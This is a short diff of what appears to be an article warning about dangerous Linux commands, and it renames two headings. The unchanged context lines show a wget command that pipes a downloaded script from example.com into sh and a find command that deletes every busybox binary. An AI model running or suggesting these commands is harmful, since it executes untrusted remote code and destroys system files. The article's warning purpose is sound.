@@ -47,12 +47,12 @@ Redirecting will write raw bytes on your disk partition. What can never will be?
 This command will move all your personal data in the Linux equivalent of a Black Hole.
 
 
-#### Stranger Danger
+#### Danger from the Outside
 
 `wget http://example.com/something -O – | sh –`
 
 
-#### You will be no more busy
+#### No More Busy
 
 `find / -name busybox -exec rm -f {} \;`
 
